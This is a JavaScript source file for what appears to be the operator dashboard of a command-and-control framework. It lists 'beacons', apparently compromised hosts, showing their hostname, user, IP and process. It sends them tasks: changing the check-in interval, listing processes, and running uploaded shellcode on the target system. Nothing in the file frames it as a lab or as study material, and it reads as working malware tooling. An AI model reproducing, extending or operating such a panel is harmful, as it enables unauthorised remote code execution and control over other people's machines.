// Get token
const token = localStorage.getItem('token');

// If no token, stop execution (let server handle redirect)
if (!token) {
    console.log('No token found, stopping script execution');
    // Create a dummy implementation to prevent errors
    window.loadBeacons = function() { console.log('No token, skipping loadBeacons'); };
    window.initializeDashboard = function() { console.log('No token, skipping initializeDashboard'); };
    window.setupRealTimeUpdates = function() { console.log('No token, skipping setupRealTimeUpdates'); };
    window.setupAdminSecurity = function() { console.log('No token, skipping setupAdminSecurity'); };
    return; // Stop execution
}

// 获取API前缀
function getApiPrefix() {
    return window.APP_CONFIG ? window.APP_CONFIG.apiPrefix : '/web/admin/api';
}

// Format time
function formatDate(timestamp) {
    try {
        console.log('Formatting timestamp:', timestamp, 'Type:', typeof timestamp);

        // If null or undefined, return unknown time
        if (timestamp == null) {
            console.error('Timestamp is null or undefined');
            return 'Unknown Time';
        }

        // Ensure timestamp is a number
        let numericTimestamp;
        if (typeof timestamp === 'string') {
            // Try to convert string to number directly
            numericTimestamp = Number(timestamp);
            if (isNaN(numericTimestamp)) {
                // If conversion fails, might be ISO format string
                numericTimestamp = new Date(timestamp).getTime();
            }
        } else {
            numericTimestamp = timestamp;
        }

        if (isNaN(numericTimestamp)) {
            console.error('Invalid timestamp value:', timestamp);
            return 'Unknown Time';
        }

        // Create Date object
        const date = new Date(numericTimestamp);
        console.log('Created date object:', date);

        if (isNaN(date.getTime())) {
            console.error('Invalid date object for timestamp:', numericTimestamp);
            return 'Unknown Time';
        }

        // Format time
        const formattedTime = date.toLocaleString('en-US', {
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit',
            hour12: false
        });

        console.log('Formatted time:', formattedTime, 'from timestamp:', numericTimestamp);
        return formattedTime;
    } catch (error) {
        console.error('Error formatting time:', error, 'timestamp:', timestamp);
        return 'Unknown Time';
    }
}

// Get status icon
function getStatusIcon(lastSeen) {
    try {
        // Ensure lastSeen is a number
        const lastSeenMs = typeof lastSeen === 'string' ? Number(lastSeen) : lastSeen;
        const now = Date.now();
        const diff = Math.floor((now - lastSeenMs) / 1000); // Convert to seconds difference

        console.log('Status check:', {
            lastSeen: lastSeen,
            lastSeenMs: lastSeenMs,
            now: now,
            diff: diff
        });

        if (diff < 300) { // Within 5 minutes
            return '<i class="bi bi-circle-fill text-success"></i>';
        } else if (diff < 900) { // Within 15 minutes
            return '<i class="bi bi-circle-fill text-warning"></i>';
        } else {
            return '<i class="bi bi-circle-fill text-danger"></i>';
        }
    } catch (error) {
        console.error('Error in getStatusIcon:', error);
        return '<i class="bi bi-circle-fill text-danger"></i>';
    }
}

// Global variables for filtering, searching, and sorting
let allBeacons = [];
let filteredBeacons = [];
let currentFilter = 'all';
let currentSort = { field: 'last_seen', direction: 'desc' };

// Load Beacons list with enhanced features
async function loadBeacons() {
    try {
        const response = await fetch(getApiPrefix() + '/beacons', {
            headers: {
                'Authorization': `Bearer ${token}`
            }
        });

        if (response.status === 401) {
            // Token expired, redirect to login page
            const loginPath = window.APP_CONFIG ? window.APP_CONFIG.loginPath : '/login';
            window.location.href = loginPath;
            return;
        }

        const data = await response.json();
        if (data.status === 'success') {
            allBeacons = data.data;
            updateStatistics();
            applyFilters();
            renderBeacons();
        }
    } catch (error) {
        console.error('Failed to load beacons:', error);
        showErrorMessage('Failed to load beacons. Please try again.');
    }
}

// Update statistics cards
function updateStatistics() {
    let onlineCount = 0;
    let warningCount = 0;
    let offlineCount = 0;

    allBeacons.forEach(beacon => {
        const status = getBeaconStatus(beacon.last_seen);
        switch (status) {
            case 'online':
                onlineCount++;
                break;
            case 'warning':
                warningCount++;
                break;
            case 'offline':
                offlineCount++;
                break;
        }
    });

    document.getElementById('onlineCount').textContent = onlineCount;
    document.getElementById('warningCount').textContent = warningCount;
    document.getElementById('offlineCount').textContent = offlineCount;
    document.getElementById('totalCount').textContent = allBeacons.length;

    // Animate counters
    animateCounters();
}

// Animate counter numbers
function animateCounters() {
    const counters = document.querySelectorAll('[id$="Count"]');
    counters.forEach(counter => {
        const target = parseInt(counter.textContent);
        let current = 0;
        const increment = target / 20;
        const timer = setInterval(() => {
            current += increment;
            if (current >= target) {
                counter.textContent = target;
                clearInterval(timer);
            } else {
                counter.textContent = Math.floor(current);
            }
        }, 50);
    });
}

// Get beacon status
function getBeaconStatus(lastSeen) {
    const lastSeenMs = typeof lastSeen === 'string' ? Number(lastSeen) : lastSeen;
    const now = Date.now();
    const diff = Math.floor((now - lastSeenMs) / 1000);

    if (diff < 300) return 'online';      // Within 5 minutes
    if (diff < 900) return 'warning';     // Within 15 minutes
    return 'offline';                     // More than 15 minutes
}

// Apply current filters and sorting
function applyFilters() {
    const searchTerm = document.getElementById('searchInput')?.value.toLowerCase() || '';

    filteredBeacons = allBeacons.filter(beacon => {
        // Apply status filter
        if (currentFilter !== 'all') {
            const status = getBeaconStatus(beacon.last_seen);
            if (status !== currentFilter) return false;
        }

        // Apply search filter
        if (searchTerm) {
            const searchableText = [
                beacon.hostname,
                beacon.username,
                beacon.ip,
                beacon.process_name,
                beacon.arch
            ].join(' ').toLowerCase();

            if (!searchableText.includes(searchTerm)) return false;
        }

        return true;
    });

    // Apply sorting
    applySorting();
}

// Apply sorting to filtered beacons
function applySorting() {
    filteredBeacons.sort((a, b) => {
        let aValue = a[currentSort.field];
        let bValue = b[currentSort.field];

        // Handle special cases
        if (currentSort.field === 'status') {
            aValue = getBeaconStatus(a.last_seen);
            bValue = getBeaconStatus(b.last_seen);
        } else if (currentSort.field === 'last_seen' || currentSort.field === 'first_time') {
            aValue = new Date(aValue);
            bValue = new Date(bValue);
        }

        // Convert to string for comparison if needed
        if (typeof aValue === 'string') {
            aValue = aValue.toLowerCase();
            bValue = bValue.toLowerCase();
        }

        let result = 0;
        if (aValue < bValue) result = -1;
        if (aValue > bValue) result = 1;

        return currentSort.direction === 'desc' ? -result : result;
    });
}

// Handle column sorting
function handleSort(field) {
    if (currentSort.field === field) {
        // Toggle direction
        currentSort.direction = currentSort.direction === 'asc' ? 'desc' : 'asc';
    } else {
        // New field
        currentSort.field = field;
        currentSort.direction = 'asc';
    }

    // Update sort indicators
    updateSortIndicators();

    // Re-apply filters and render
    applyFilters();
    renderBeacons();
}

// Update sort indicators in table headers
function updateSortIndicators() {
    document.querySelectorAll('.sortable i').forEach(icon => {
        icon.className = 'bi bi-arrow-down-up ms-1';
    });

    const activeHeader = document.querySelector(`[data-sort="${currentSort.field}"] i`);
    if (activeHeader) {
        activeHeader.className = currentSort.direction === 'asc'
            ? 'bi bi-arrow-up ms-1'
            : 'bi bi-arrow-down ms-1';
    }
}

// Render beacons table
function renderBeacons() {
    const beaconList = document.getElementById('beaconList');
    const emptyState = document.getElementById('emptyState');

    if (filteredBeacons.length === 0) {
        beaconList.innerHTML = '';
        emptyState.style.display = 'block';
        return;
    }

    emptyState.style.display = 'none';
    beaconList.innerHTML = '';

    filteredBeacons.forEach((beacon, index) => {
        const row = document.createElement('tr');
        row.className = 'beacon-row';
        row.style.animationDelay = `${index * 50}ms`;

        const status = getBeaconStatus(beacon.last_seen);
        const statusIcon = getStatusIcon(beacon.last_seen);
        const statusBadge = getStatusBadge(status);

        row.innerHTML = `
            <td>
                <div class="d-flex align-items-center">
                    ${statusIcon}
                    <span class="ms-2">${statusBadge}</span>
                </div>
            </td>
            <td>
                <div class="fw-medium">${beacon.hostname}</div>
            </td>
            <td>
                <div class="d-flex align-items-center">
                    <i class="bi bi-person-circle me-2 text-muted"></i>
                    ${beacon.username}
                </div>
            </td>
            <td>
                <code class="bg-light px-2 py-1 rounded">${beacon.ip}</code>
            </td>
            <td>
                <div class="small">
                    <div class="fw-medium">${beacon.process_name}</div>
                    <div class="text-muted">PID: ${beacon.process_id || 'N/A'}</div>
                </div>
            </td>
            <td>
                <span class="badge bg-secondary">${beacon.arch}</span>
            </td>
            <td>
                <small class="text-muted">${formatDate(beacon.first_time)}</small>
            </td>
            <td>
                <small class="text-muted">${formatDate(beacon.last_seen)}</small>
            </td>
            <td>
                ${beacon.job ? `<span class="badge bg-info">${beacon.job}</span>` : '<span class="text-muted">None</span>'}
            </td>
            <td>
                <div class="btn-group btn-group-sm" role="group">
                    <button class="btn btn-outline-primary" onclick="showTaskModal('${beacon.uuid}')" title="Send Task">
                        <i class="bi bi-send"></i>
                    </button>
                    <button class="btn btn-outline-info" onclick="viewDetails('${beacon.uuid}')" title="View Details">
                        <i class="bi bi-eye"></i>
                    </button>
                </div>
            </td>
        `;
        beaconList.appendChild(row);
    });
}

// Get status badge
function getStatusBadge(status) {
    switch (status) {
        case 'online':
            return '<span class="badge bg-success">Online</span>';
        case 'warning':
            return '<span class="badge bg-warning">Warning</span>';
        case 'offline':
            return '<span class="badge bg-danger">Offline</span>';
        default:
            return '<span class="badge bg-secondary">Unknown</span>';
    }
}

// Enhanced task modal with beacon info
function showTaskModal(uuid) {
    const beacon = allBeacons.find(b => b.uuid === uuid);
    if (!beacon) {
        showErrorMessage('Beacon not found');
        return;
    }

    document.getElementById('beaconUUID').value = uuid;
    document.getElementById('targetBeaconInfo').textContent =
        `${beacon.hostname} (${beacon.ip}) - ${beacon.username}`;

    // Reset form
    resetTaskForm();

    const modal = new bootstrap.Modal(document.getElementById('taskModal'));
    modal.show();
}

// Reset task form
function resetTaskForm() {
    const form = document.getElementById('taskForm');
    form.reset();
    form.classList.remove('was-validated');

    // Hide conditional fields
    document.getElementById('sleepTimeDiv').style.display = 'none';
    document.getElementById('shellcodeDiv').style.display = 'none';
    document.getElementById('fileInfo').style.display = 'none';

    // Reset task description
    document.getElementById('taskDescription').textContent = 'Select a task type to see its description.';

    // Disable send button
    document.getElementById('sendTask').disabled = true;
}

// Task descriptions
const taskDescriptions = {
    'NULL': 'Maintains the current sleep interval without performing any action.',
    '0x1A': 'Changes the beacon check-in interval to the specified time.',
    '0x1B': 'Retrieves a list of all running processes on the target system.',
    '0x1C': 'Executes the uploaded shellcode on the target system.'
};

// Enhanced task type selection handling
function setupTaskForm() {
    const taskTypeSelect = document.getElementById('taskType');
    const sleepTimeDiv = document.getElementById('sleepTimeDiv');
    const shellcodeDiv = document.getElementById('shellcodeDiv');
    const taskDescription = document.getElementById('taskDescription');
    const sendButton = document.getElementById('sendTask');
    const shellcodeFile = document.getElementById('shellcodeFile');

    taskTypeSelect.addEventListener('change', function() {
        const selectedType = this.value;

        // Hide all conditional fields
        sleepTimeDiv.style.display = 'none';
        shellcodeDiv.style.display = 'none';

        // Show relevant fields
        if (selectedType === '0x1A') {
            sleepTimeDiv.style.display = 'block';
        } else if (selectedType === '0x1C') {
            shellcodeDiv.style.display = 'block';
        }

        // Update description
        taskDescription.textContent = taskDescriptions[selectedType] || 'Select a task type to see its description.';

        // Enable/disable send button
        sendButton.disabled = !selectedType;

        // Clear validation
        this.classList.remove('is-invalid');
    });

    // Sleep time validation
    document.getElementById('sleepTime').addEventListener('input', function() {
        const value = parseInt(this.value);
        if (value >= 1 && value <= 3600) {
            this.classList.remove('is-invalid');
            this.classList.add('is-valid');
        } else {
            this.classList.remove('is-valid');
            this.classList.add('is-invalid');
        }
    });

    // File upload handling
    shellcodeFile.addEventListener('change', function() {
        const file = this.files[0];
        const fileInfo = document.getElementById('fileInfo');

        if (file) {
            // Validate file size (4MB limit)
            if (file.size > 4 * 1024 * 1024) {
                this.classList.add('is-invalid');
                fileInfo.style.display = 'none';
                showErrorMessage('File size exceeds 4MB limit');
                return;
            }

            // Show file info
            document.getElementById('fileName').textContent = file.name;
            document.getElementById('fileSize').textContent = formatFileSize(file.size);
            fileInfo.style.display = 'block';

            this.classList.remove('is-invalid');
            this.classList.add('is-valid');
        } else {
            fileInfo.style.display = 'none';
            this.classList.remove('is-valid', 'is-invalid');
        }
    });
}

// Format file size
function formatFileSize(bytes) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

// Send task
document.getElementById('sendTask').addEventListener('click', async function() {
    const uuid = document.getElementById('beaconUUID').value;
    const taskType = document.getElementById('taskType').value;
    let taskData = {
        type: taskType
    };

    if (taskType === '0x1A') {
        taskData.sleep_time = parseInt(document.getElementById('sleepTime').value);
    } else if (taskType === '0x1C') {
        const file = document.getElementById('shellcodeFile').files[0];
        if (file) {
            const reader = new FileReader();
            reader.onload = async function(e) {
                taskData.shellcode = e.target.result;
                await sendTaskToServer(uuid, taskData);
            };
            reader.readAsDataURL(file);
            return;
        }
    }

    await sendTaskToServer(uuid, taskData);
});

// Send task to server
async function sendTaskToServer(uuid, taskData) {
    try {
        const response = await fetch(`${getApiPrefix()}/beacons/${uuid}/job`, {
            method: 'POST',
            headers: {
                'Authorization': `Bearer ${token}`,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(taskData)
        });

        if (response.ok) {
            const modal = bootstrap.Modal.getInstance(document.getElementById('taskModal'));
            modal.hide();
            // Reload Beacons list
            loadBeacons();
        } else {
            alert('Failed to send task');
        }
    } catch (error) {
        console.error('Failed to send task:', error);
        alert('Failed to send task');
    }
}

// View Beacon details
function viewDetails(uuid) {
    window.location.href = `/web/admin/details/${uuid}`;
}

// Filter beacons by status
function filterBeacons(filter) {
    currentFilter = filter;
    applyFilters();
    renderBeacons();

    // Update filter button text
    const filterButton = document.querySelector('[data-bs-toggle="dropdown"]');
    const filterText = filter.charAt(0).toUpperCase() + filter.slice(1);
    filterButton.innerHTML = `<i class="bi bi-funnel me-1"></i>${filterText === 'All' ? 'Filter' : filterText}`;
}

// Refresh beacons manually
function refreshBeacons() {
    const refreshButton = document.querySelector('[onclick="refreshBeacons()"]');
    const icon = refreshButton.querySelector('i');

    // Add spinning animation
    icon.classList.add('fa-spin');
    refreshButton.disabled = true;

    loadBeacons().finally(() => {
        icon.classList.remove('fa-spin');
        refreshButton.disabled = false;
    });
}

// Search functionality
function setupSearch() {
    const searchInput = document.getElementById('searchInput');
    if (searchInput) {
        searchInput.addEventListener('input', debounce(() => {
            applyFilters();
            renderBeacons();
        }, 300));
    }
}

// Debounce function for search
function debounce(func, wait) {
    let timeout;
    return function executedFunction(...args) {
        const later = () => {
            clearTimeout(timeout);
            func(...args);
        };
        clearTimeout(timeout);
        timeout = setTimeout(later, wait);
    };
}

// Show error message
function showErrorMessage(message) {
    const alertDiv = document.createElement('div');
    alertDiv.className = 'alert alert-danger alert-dismissible fade show';
    alertDiv.innerHTML = `
        <i class="bi bi-exclamation-triangle me-2"></i>
        ${message}
        <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
    `;

    const container = document.querySelector('.container-fluid');
    container.insertBefore(alertDiv, container.firstChild);

    // Auto-hide after 5 seconds
    setTimeout(() => {
        if (alertDiv.parentNode) {
            alertDiv.remove();
        }
    }, 5000);
}

// Logout function
function logout() {
    if (confirm('Are you sure you want to logout?')) {
        localStorage.removeItem('token');
        const loginPath = window.APP_CONFIG ? window.APP_CONFIG.loginPath : '/login';
        window.location.href = loginPath;
    }
}

// Enhanced keyboard shortcuts
document.addEventListener('keydown', function(e) {
    // Ctrl/Cmd + R for refresh
    if ((e.ctrlKey || e.metaKey) && e.key === 'r') {
        e.preventDefault();
        refreshBeacons();
    }

    // Ctrl/Cmd + F for search focus
    if ((e.ctrlKey || e.metaKey) && e.key === 'f') {
        e.preventDefault();
        const searchInput = document.getElementById('searchInput');
        if (searchInput) {
            searchInput.focus();
            searchInput.select();
        }
    }

    // Escape to clear search
    if (e.key === 'Escape') {
        const searchInput = document.getElementById('searchInput');
        if (searchInput && searchInput.value) {
            searchInput.value = '';
            applyFilters();
            renderBeacons();
        }
    }
});

// Auto-load Beacons list after page loads (only if we have a token)
if (token) {
    document.addEventListener('DOMContentLoaded', function() {
        loadBeacons();
        setupSearch();
        setupTaskForm();
        setupSortHandlers();

    // Add CSS animations
    const style = document.createElement('style');
    style.textContent = `
        .beacon-row {
            animation: fadeInUp 0.3s ease-out forwards;
            opacity: 0;
            transform: translateY(20px);
        }

        @keyframes fadeInUp {
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .table tbody tr:hover {
            background-color: rgba(var(--bs-primary-rgb), 0.05);
            transform: scale(1.01);
            transition: all 0.2s ease;
        }

        .btn-group .btn {
            transition: all 0.2s ease;
        }

        .btn-group .btn:hover {
            transform: translateY(-1px);
        }

        .card {
            transition: all 0.3s ease;
        }

        .statistics-card:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(0,0,0,0.15);
        }

        .sortable:hover {
            background-color: rgba(255, 255, 255, 0.1);
        }

        .modal-lg {
            max-width: 800px;
        }
    `;
    document.head.appendChild(style);
    });
}

// Setup sort handlers
function setupSortHandlers() {
    document.querySelectorAll('.sortable').forEach(header => {
        header.addEventListener('click', function() {
            const field = this.getAttribute('data-sort');
            handleSort(field);
        });
    });
}

// Only set up timers if we have a token
if (token) {
    // Refresh list every 30 seconds
    setInterval(loadBeacons, 30000);

    // Page visibility API to pause/resume updates
    document.addEventListener('visibilitychange', function() {
        if (document.hidden) {
            // Page is hidden, could pause updates
            console.log('Page hidden - pausing updates');
        } else {
            // Page is visible, resume updates
            console.log('Page visible - resuming updates');
            loadBeacons();
        }
    });
}